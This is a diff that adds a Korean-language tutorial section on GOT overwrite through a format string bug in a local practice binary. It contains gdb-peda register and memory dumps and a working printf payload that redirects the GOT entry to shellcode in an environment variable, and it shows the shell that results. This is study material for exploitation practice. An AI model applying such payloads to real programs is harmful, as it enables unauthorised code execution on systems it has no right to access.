@@ -714,7 +714,71 @@ pwd
 ## [+] Training 4
 
 이번엔 GOT Overwrite를 이용하여 공격을 해본다.
-저녁에 계소옥
+예제 소스코드에서는 두번의 `printf` 함수가 호출되므로, `dl_reslove` 함수를 거치지 않고 바로 변조해주면 된다.
+
+```
+gdb-peda$ si
+
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffd5d6 --> 0x30 ('0')
+EBX: 0x0 
+ECX: 0x804b410 ("AAAA\n")
+EDX: 0xf7fb4870 --> 0x0 
+ESI: 0xf7fb3000 --> 0x1b1db0 
+EDI: 0xf7fb3000 --> 0x1b1db0 
+EBP: 0xffffd5d8 --> 0x0 
+ESP: 0xffffd5b4 --> 0x8048505 (<main+58>:	add    esp,0x8)
+EIP: 0x8048380 (<printf@plt>:	jmp    DWORD PTR ds:0x804a010)
+EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048370 <strcmp@plt>:	jmp    DWORD PTR ds:0x804a00c
+   0x8048376 <strcmp@plt+6>:	push   0x0
+   0x804837b <strcmp@plt+11>:	jmp    0x8048360
+=> 0x8048380 <printf@plt>:	jmp    DWORD PTR ds:0x804a010
+ | 0x8048386 <printf@plt+6>:	push   0x8
+ | 0x804838b <printf@plt+11>:	jmp    0x8048360
+ | 0x8048390 <fgets@plt>:	jmp    DWORD PTR ds:0x804a014
+ | 0x8048396 <fgets@plt+6>:	push   0x10
+ |->   0xf7e4a670 <__printf>:	call   0xf7f20b59 <__x86.get_pc_thunk.ax>
+       0xf7e4a675 <__printf+5>:	add    eax,0x16898b
+       0xf7e4a67a <__printf+10>:	sub    esp,0xc
+       0xf7e4a67d <__printf+13>:	mov    eax,DWORD PTR [eax-0x68]
+                                                                  JUMP is taken
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd5b4 --> 0x8048505 (<main+58>:	add    esp,0x8)
+0004| 0xffffd5b8 --> 0x80485c0 --> 0xa7825 ('%x\n')
+0008| 0xffffd5bc --> 0xffffd5d6 --> 0x30 ('0')
+0012| 0xffffd5c0 --> 0x414133dc 
+0016| 0xffffd5c4 --> 0xa4141 ('AA\n')
+0020| 0xffffd5c8 --> 0x8048549 (<__libc_csu_init+9>:	add    ebx,0x1ab7)
+0024| 0xffffd5cc --> 0x0 
+0028| 0xffffd5d0 --> 0xf7fb3000 --> 0x1b1db0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x08048380 in printf@plt ()
+gdb-peda$ x/16x 0x804a010
+0x804a010:	0xf7e4a670	0xf7e5f150	0x080483a6	0xf7e19540
+0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
+```
+
+현재 GOT는 `0x804a010` 위치에 존재한다. 해당 위치의 4바이트를 쉘 코드가 위치한 환경변수의 주소로 변조한다.
+
+```
+root@shh0ya-Linux:~/pwn/fsb# (python -c 'print "AA\x10\xa0\x04\x08"+"AAAA\x12\xa0\x04\x08"+"%55316x%hn"+"%10205x%hn"'; cat)|./exam
+
+AAAAAA .... 4141e550 ... 41414141
+
+ls
+a.out  env  env.c  exam  exam.c  norm.c  peda-session-a.out.txt  peda-session-exam.txt
+     
+pwd
+/root/pwn/fsb
+```
+
+위와 같이 쉘을 획득할 수 있는 것을 볼 수 있다.
+
+
 
 
 
